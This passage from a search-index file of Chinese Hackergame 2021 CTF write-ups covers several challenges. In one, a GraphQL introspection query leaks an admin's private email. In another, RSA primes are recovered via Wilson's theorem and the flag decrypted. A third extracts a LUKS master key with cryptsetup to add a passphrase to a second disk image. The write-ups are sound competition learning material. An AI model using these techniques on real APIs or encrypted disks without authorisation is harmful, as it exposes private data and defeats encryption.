\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 </p> <p>\u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq </p>"}, {"location": "writeups/hackergame2021/#_8", "title": "\u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f", "text": "<p>\u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002</p> <p>\u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f</p> <p>\u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1</p> <p>\u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a</p> <ul> <li>GraphQL\u5b98\u7f51\uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528</li> <li>GraphiQL\uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI</li> <li>\u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e</li> <li>GraphQL Voyager\uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784</li> </ul> <p>\u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 <code>\u7f51\u5740/graphql?query=...</code> \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee <code>\u7f51\u5740/graphiql</code> \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2</p> <p>\u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c <pre><code>query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}\n</code></pre> </p> <p>\u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a </p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>query { user(id: 1) { privateEmail, } }\n\n&gt;&gt;&gt; {\n  \"data\": {\n    \"user\": {\n      \"privateEmail\": \"flag{...}\"\n    }\n  }\n}\n</code></pre></p>"}, {"location": "writeups/hackergame2021/#easy-rsa", "title": "Easy RSA", "text": "<p>\u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002</p> <p>\u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002</p> <p>\u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840</p> <p>\u770b\u4ee3\u7801\uff01 <pre><code>e = 65537\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    value_p = sympy.nextprime((math.factorial(y)) % x)  # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\n    return value_p\n\ndef get_q():\n    value = [getPrime(256)]\n    for i in range(1, 10):\n        value.append(sympy.nextprime(value[i - 1]))\n    print(\"value[-1] = \", value[-1])\n    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967\n    n = 1\n    for i in range(10):\n        n = n * value[i]\n    q = getPrime(512)\n    value_q = pow(q, e, n)\n    print(\"value_q = \", value_q)\n    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    return sympy.nextprime(q)\n\n# this destroyes the rsa cryptosystem\np = get_p()\nq = get_q()\n\nm = int.from_bytes(open(\"flag.txt\", \"rb\").read(), \"big\")\nc = pow(m, e, p * q)\nprint(\"c = \", c)\n# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f <code>get_p()</code> \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca <code>get_q()</code> \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898</p> <p>get_p:</p> <p>\u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1aBUU-RSA [RoarCTF2019]babyRSA</p> <p>\u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709</p> \\[ (x - 1)! \\equiv -1\\pmod{x} \\] <p>\u6240\u4ee5\uff1a</p> \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] <p>\u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a</p> \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] <p>\uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a <pre><code>def get_p():\n    x = ...\n    y = ...\n    k = 1\n    for i in range(y + 1, x):\n        k = (k * i) % x \n    res = (-gmpy2.invert(k, x)) % x \n    return sympy.nextprime(res)\n</code></pre></p> <p>get_q:</p> <p>\u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 <code>sympy.prevprime</code> \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 <pre><code>value = [80096058210213458444437404275177554701604739094679033012396452382975889905967]\nfor i in range(1, 10):\n    value.append(sympy.prevprime(value[i - 1]))\nprint(\"value[-1] = \", value[-1])\n</code></pre></p> <p>\u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a</p> <ul> <li>q\uff1a\u5bc6\u6587</li> <li>e\uff1a\u79c1\u94a5</li> <li>value_q\uff1a\u660e\u6587</li> <li>n\uff1a\u5c31\u662f n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 </li> </ul> <p>\u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e\u6b27\u62c9\u51fd\u6570\u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1)</p> <p>\u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c</p> <pre><code>n = phi = 1\nfor i in range(10):\n    n = n * value[i]\n    phi *= (value[i] - 1)\n\nvalue_q = ...\nd = pow(e, -1, phi) \nq = pow(value_q, d, n)\nreturn sympy.nextprime(q)\n</code></pre> <p>flag:</p> <p>\u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a <pre><code>e = 65537\np = get_p()\nq = get_q()\n\nc = ...\nd = pow(e, -1, (p-1) * (q-1))\nm = pow(c, d, p * q)\n\nprint(int.to_bytes(m, 30, byteorder=\"big\"))\n</code></pre></p>"}, {"location": "writeups/hackergame2021/#u", "title": "\u52a0\u5bc6\u7684 U \u76d8", "text": "<p>\uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002</p> <p>\u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d</p> <p>\u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d</p> <p>\u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector <pre><code>$ file *.img \nday1.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)\nday2.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)\n</code></pre> \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a <pre><code>$ file *.img \nMy Disk.img:   LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998\nMy Disk 2.img: LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998\n</code></pre> \u53d1\u73b0\u90fd\u662f LUKS encrypted file</p> <p>\u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d</p> <p>\u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img  \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3\uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684</p> <p>\u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002</p> <p>\u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 <code>master-key</code> \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a10 Linux cryptsetup Examples for LUKS Key Management\uff09</p> <p>\u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a <pre><code>$ cryptsetup luksDump --dump-master-key MyDisk.img  # \u8f93\u51fa master-key\n...\nMK dump:    be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 \n            72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c \n            ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 \n            60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a\n$ cat \"be...9a\" &gt; master_key.txt # \u5b58\u5165\u6587\u4ef6\n$ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236\n$ cryptsetup luksAddKey MyDisk2.img --master-key-file &lt;(cat master_key.bin) # \u6dfb\u52a0\u5bc6\u7801\nEnter new passphrase for key slot:    # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801\nVerify passphrase: \n</code></pre> \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86</p>"}, {"location": "writeups/hackergame2021/#_9", "title": "\u8d5b\u535a\u53a8\u623f", "text": "<p>\u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002</p> <p>\u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002</p> <p>\u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002</p> <p>\u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002</p> <p>\u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a</p> <p>\u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c</p> <p>\u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01</p> <p>\u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d \u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42</p> <p>\u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981\u9884\u6d4b\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31</p>"}, {"location": "writeups/hackergame2021/#level-0", "title": "Level 0", "text": "<p>\u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31\u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd</p> 